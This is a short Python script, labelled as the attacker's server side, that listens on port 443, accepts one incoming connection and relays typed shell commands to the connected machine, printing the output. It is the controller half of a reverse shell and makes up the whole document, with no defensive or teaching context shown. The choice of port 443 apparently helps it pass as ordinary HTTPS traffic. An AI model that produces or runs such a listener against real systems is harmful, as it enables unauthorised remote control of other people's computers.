# Server side (attacker)
import socket

host = "0.0.0.0"
port = 443

server = socket.socket()
server.bind((host, port))
server.listen(1)
print("[*] Waiting for connection...")
client, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = input(">> ")
    client.send(cmd.encode())
    if cmd == "exit":
        break
    
    print(client.recv(4096).decode())

client.close()
